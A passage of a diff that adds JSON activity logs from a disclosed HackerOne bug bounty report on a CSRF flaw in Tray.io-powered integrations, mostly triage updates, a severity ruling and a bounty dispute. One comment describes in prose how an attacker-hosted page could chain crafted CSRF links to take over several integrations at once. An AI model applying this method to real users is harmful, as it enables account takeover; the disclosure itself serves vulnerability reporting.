rZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=618075b7c6560eba0fef14e443c4bdf0b19a7a3edecf32fc8131f223ff072bd7"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 18926115,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @medmahmoudi Thanks for your submission. We're discussing final ruling on this report, and when/if a fix will be implemented and will get back to you as soon as possible.",
+      "automated_response": false,
+      "created_at": "2022-10-24T12:49:16.663Z",
+      "updated_at": "2022-10-24T12:49:16.663Z",
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 18943497,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-10-25T13:16:14.344Z",
+      "updated_at": "2022-10-25T13:16:14.344Z",
+      "actor": {
+        "username": "tayloraltman",
+        "cleared": false,
+        "verified": false,
+        "url": "/tayloraltman",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 18963890,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-10-26T09:31:31.295Z",
+      "updated_at": "2022-10-26T09:31:31.295Z",
+      "actor": {
+        "username": "nicktray",
+        "cleared": false,
+        "verified": false,
+        "url": "/nicktray",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/401/271/f9759ce4cd05d10603313a1e7ec20c6d71c2d674_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 18970298,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-10-26T15:42:31.115Z",
+      "updated_at": "2022-10-26T15:42:31.115Z",
+      "actor": {
+        "username": "shamail_glit3h",
+        "cleared": false,
+        "verified": false,
+        "url": "/shamail_glit3h",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/e7g7kc85m6x2e2b71tgf8jx09pg1/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 18981849,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-10-27T09:42:54.993Z",
+      "updated_at": "2022-10-27T09:42:54.993Z",
+      "actor": {
+        "username": "alextray",
+        "cleared": false,
+        "verified": false,
+        "url": "/alextray",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/fNEfcnqSTTwnsipcsg2EYe6n/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19034650,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey everyone ! Any updates on this issue ?",
+      "automated_response": false,
+      "created_at": "2022-11-01T13:33:26.616Z",
+      "updated_at": "2022-11-01T13:33:26.616Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19036952,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @medmahmoudi Thanks for your patience, our partner (Tray) is still investigating this, we'll get back to you soon.",
+      "automated_response": false,
+      "created_at": "2022-11-01T15:11:58.024Z",
+      "updated_at": "2022-11-01T15:11:58.024Z",
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19223665,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @rutger77 ! The state of the report hasn't changed from \"new\" since I have sent the report. It's been more than a month now and I am starting to worry. Is the state of my report relevant to Tray's investigation and fix ?\n\nBest Regards,\nMedMahmoudi",
+      "automated_response": false,
+      "created_at": "2022-11-15T11:44:51.018Z",
+      "updated_at": "2022-11-15T11:44:51.018Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19254774,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @medmahmoudi I'm so sorry for the silence, I've been pushing Tray for the state of this. They have come to the conclusion this is an issue indeed.  They've proposed a fix for it internally, but there are a lot of dependencies around it, so no estimate on when they fix will be able to fix this.\n\nIn the mean time, I'll go ahead and triage this.",
+      "automated_response": false,
+      "created_at": "2022-11-17T11:55:21.080Z",
+      "updated_at": "2022-11-17T11:55:21.080Z",
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19254784,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "Added the correct severity.",
+      "automated_response": false,
+      "created_at": "2022-11-17T11:56:06.133Z",
+      "updated_at": "2022-11-17T11:56:06.133Z",
+      "additional_data": {
+        "old_severity": "Critical",
+        "new_severity": "High (7.4)",
+        "old_severity_id": 1691754,
+        "new_severity_id": 1748587
+      },
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19254793,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Report validated by Tray. Waiting for a fix from them.",
+      "automated_response": false,
+      "created_at": "2022-11-17T11:56:49.509Z",
+      "updated_at": "2022-11-17T11:56:49.509Z",
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19262951,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @rutger77 \nThanks for triaging my report. I respect your decision of severity. However, I am afraid I disagree. I would consider the impact limited to \"High\" if the impact was limited to Github's integration. Meanwhile, the attack is reproducible against all other integrations that are built on top of Tray. Which to my opinion, makes the impact critical.\n\nExamples of vulnerable integrations: Microsoft Teams, Jira, Azure DevOps, Splunk..\n\n### Takeover of multiple integrations with one click\n\nTo takeover one integration, the victim needs to visit one link crafted by the attack. The attacker could prepare a list of exploit url. Each url would perform the CSRF to takeover one integrations. (Link 1: impacts Github, Link 2: impacts Jira..)\n\nThe attacker hosts an exploit on his server. The exploit would open all the urls in the exploit list into different windows. If the victim has any of the vulnerable integrations installed. The attacker would have access to his accounts seconds after he visits the exploit page.\n\nWhy would this work ? The victim wouldn't be asked to Authorize to Hackerone(Tray.io behind the scenes) when they visit the attacker's exploit url. \n\nIf I record a video where I takeover multiple integrations with one click from the victim side, would you consider bumping the severity ?\n\nBest Regards,\nMedMahmoudi\n",
+      "automated_response": false,
+      "created_at": "2022-11-18T02:33:28.122Z",
+      "updated_at": "2022-11-18T02:33:28.122Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19294779,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @medmahmoudi \n\nThanks for your reply. We use the CVSS calculator to determine the severity of a report. \n\nTwo major factors in your report are: \n1. Attack complexity. This resolves to High, as you need specific network access to intercept the user.\n2. User Interaction. This one resolves to Required, as the user needs to connect to a network where the attacker also has access.\n\nThis brings the severity to high on our side. I Advise you to take a look at the calculator and see how it works and several parts of it influence the severity of the report. \n\nBest Regards,\n\nRutger",
+      "automated_response": false,
+      "created_at": "2022-11-21T14:57:12.783Z",
+      "updated_at": "2022-11-21T14:57:12.783Z",
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19299184,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @rutger77,\nThanks for the explanation. This is understandable.\nI am glad for scoring it ! Please let me know if you have more questions on your side.\n\nBest Regards,\nMedMahmoudi",
+      "automated_response": false,
+      "created_at": "2022-11-21T21:25:48.408Z",
+      "updated_at": "2022-11-21T21:25:48.408Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19429945,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @rutger77 ! Are there any updates on the bounty ?",
+      "automated_response": false,
+      "created_at": "2022-12-03T14:40:57.025Z",
+      "updated_at": "2022-12-03T14:40:57.025Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19502608,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Any updates ?",
+      "automated_response": false,
+      "created_at": "2022-12-09T12:51:56.700Z",
+      "updated_at": "2022-12-09T12:51:56.700Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19526663,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @medmahmoudi \n\nWe are in process of discussing this with Tray.IO to see who should take ownership of paying this bounty to make sure you get paid the appropriate amount. I will keep you posted.\n\nRutger",
+      "automated_response": false,
+      "created_at": "2022-12-12T10:46:27.528Z",
+      "updated_at": "2022-12-12T10:46:27.528Z",
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19710658,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @rutger77 \nIt's almost 2023 ! I hate to keep spamming, but where are we at with the bounty ?\n\nHappy new year !",
+      "automated_response": false,
+      "created_at": "2022-12-26T16:19:13.806Z",
+      "updated_at": "2022-12-26T16:19:13.806Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19761262,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::HackerRequestedMediation",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-01-02T15:16:31.526Z",
+      "updated_at": "2023-01-02T15:16:31.526Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19838934,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Happy new year @medmahmoudi\n\nThanks for your patience and sorry for the delay here as we were on holiday past few weeks. \n\nI hope you understand that this is an unusual situation for us as we rely on the owner of the integrations (Tray.IO) to provide us with the appropriate information. Usually we will wait with payout until the third-party vendor has fixed the issue. I've asked them for an update about this.\n\nAbout the bounty: As the report was submitted on October 8th, we use the bounty amounts that were applicable at that moment. For a high severity at that time it was $7,879 see https://hackerone.com/security/bounty_table_versions?change=2022-09-30T17%3A00%3A10.789Z for more information about the history of bounty amounts.\nNext to that, as this is an issue with a third-party vendor we typically pay out 20% of the bounty as a bonus, not the entire bounty.\n\nI hope this helps to understand things and I hope to hear from Tray quickly.\n\nBest regards,\n\nRutger",
+      "automated_response": false,
+      "created_at": "2023-01-09T10:04:32.226Z",
+      "updated_at": "2023-01-09T10:04:32.226Z",
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19843321,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @rutger77,\n\nI can understand why the bounty would be 7,879$ instead of 12,500. But can you clarify the following statement: \"Next to that, as this is an issue with a third-party vendor we typically pay out 20% of the bounty as a bonus, not the entire bounty.\"\n\nI don't see this rule mentioned anywhere in your policy. In a real world scenario, if a malicious threat actor would exploit this issue, the damage would cost Hackerone much more than the entire bounty. It's not fair to reduce the bounty to 20%, especially that this rule is not mentioned anywhere in your policy. ",
+      "automated_response": false,
+      "created_at": "2023-01-09T13:31:21.570Z",
+      "updated_at": "2023-01-09T13:31:21.570Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19869048,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @medmahmoudi \n\nI understand what you're saying, but as this concerns systems we do not control at all this usually would be considered out of scope and would be closed as such. Us offering part of the bounty is a way to show our gratitude.\n\nBest regards,\n\nRutger",
+      "automated_response": false,
+      "created_at": "2023-01-10T16:35:55.444Z",
+      "updated_at": "2023-01-10T16:35:55.444Z",
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19889018,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "You chose to use Tray.io. You could have coded every single integration manually, but you didn't. It was your team's decision to rely on someone else's code. You consciously chose to take the risk. The least you could do is take full responsibility for it.\n\nAlso you chose to triage the vulnerability and you decided the severity. You could have asked me to report it to the vendor from the beginning and you could have closed the report, but you didn't. Because the vulnerability is right at the center of your scope, and the impact is too high to be ignored.\n\nI have been patient for 90 days and I have respected all your guidelines. What is happening here is not you showing \"gratitude\". It's far from that. This is called disrespect. I am not taking your 20%. I deserve the full bounty, I know it, you know it and the whole world knows it. ",
+      "automated_response": false,
+      "created_at": "2023-01-11T14:05:54.494Z",
+      "updated_at": "2023-01-11T14:05:54.494Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 19889033,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportCollaboratorInvited",
+      "message": null,
+      "automated_response": false,
+      "created_at": "2023-01-11T14:07:13.999Z",
+      "updated_at": "2023-01-11T14:07:13.999Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 20307505,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Greetings,\n\nAre there any updates on this issue ? ",
+      "automated_response": false,
+      "created_at": "2023-02-08T19:17:56.274Z",
+      "updated_at": "2023-02-08T19:17:56.274Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 20376093,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @medmahmoudi - although I appreciate the conversation you had with the team, I'd like to point out that our decision on the reward is final. Our policy is to pay 1/5th of the bounty for a vulnerability that is in a system that is not under our control, which is the case here. Prior to this policy, we wouldn't have awarded a bounty for it at all. We're more than happy to publicly disclose your finding once it has been remediated so you can have others weigh in.",
+      "automated_response": false,
+      "created_at": "2023-02-13T17:48:54.607Z",
+      "updated_at": "2023-02-13T17:48:54.607Z",
+      "actor": {
+        "username": "jobert",
+        "cleared": true,
+        "verified": true,
+        "url": "/jobert",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 20378889,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey Jobert ! Thanks for getting in on the action.\nDespite lack of clarity in the program policy, I respect your final decision. I suggest making this rule clear in your program policy to avoid confusion in the future. \n\nAs for disclosure, I'd be happy to disclose once the fix takes place. \n\nWith that being said, I'll go ahead and report it to the Vendor. \n\nRegards,\nMedMahmoudi",
+      "automated_response": false,
+      "created_at": "2023-02-13T22:47:06.934Z",
+      "updated_at": "2023-02-13T22:47:06.934Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 21058914,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Thanks again for bringing this to our attention, it's much appreciated!\n\n@medmahmoudi Tray.IO has informed us that they deployed a fix for this, however they also discovered there is still a vulnerability around this that they are looking in to.\n\nIn the mean time we will pay out the amount as discussed.\n\nHappy Hacking! ",
+      "automated_response": false,
+      "created_at": "2023-03-31T12:59:00.890Z",
+      "updated_at": "2023-03-31T12:59:00.890Z",
+      "actor": {
+        "url": "/security",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "HackerOne"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "security",
+      "collaborator": {
+        "username": "medmahmoudi",
+        "url": "/medmahmoudi"
+      }
+    },
+    {
+      "id": 21665417,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Greetings, can we disclose ?",
+      "automated_response": false,
+      "created_at": "2023-05-03T12:55:16.744Z",
+      "updated_at": "2023-05-03T12:55:16.744Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 21931017,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Still waiting for disclosure..",
+      "automated_response": false,
+      "created_at": "2023-05-19T15:44:33.697Z",
+      "updated_at": "2023-05-19T15:44:33.697Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 22417265,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @medmahmoudi \n\nI'm really sorry about the slow response here. As said before, we do rely on information provided by Tray. They've finally agreed on closing and disclosing the report.\nThanks for your patience.\n\nRutger",
+      "automated_response": false,
+      "created_at": "2023-06-19T14:43:30.704Z",
+      "updated_at": "2023-06-19T14:43:30.704Z",
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "reporter": {
+        "username": "medmahmoudi",
+        "url": "/medmahmoudi"
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 22417270,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-06-19T14:44:08.082Z",
+      "updated_at": "2023-06-19T14:44:08.082Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "rutger77",
+        "cleared": false,
+        "verified": false,
+        "url": "/rutger77",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/HEpjhHJdRjX1BwF1vua6aTns/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": true
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 22420540,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-06-19T20:15:24.857Z",
+      "updated_at": "2023-06-19T20:15:24.857Z",
+      "actor": {
+        "username": "medmahmoudi",
+        "cleared": false,
+        "verified": true,
+        "url": "/medmahmoudi",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/4j3g59ickevgfs0f2vgcn552wjxw/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "security"
+    },
+    {
+      "id": 22420541,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-06-19T20:15:24.991Z",
+      "updated_at": "2023-06-19T20:15:24.991Z",
+      "actor": {
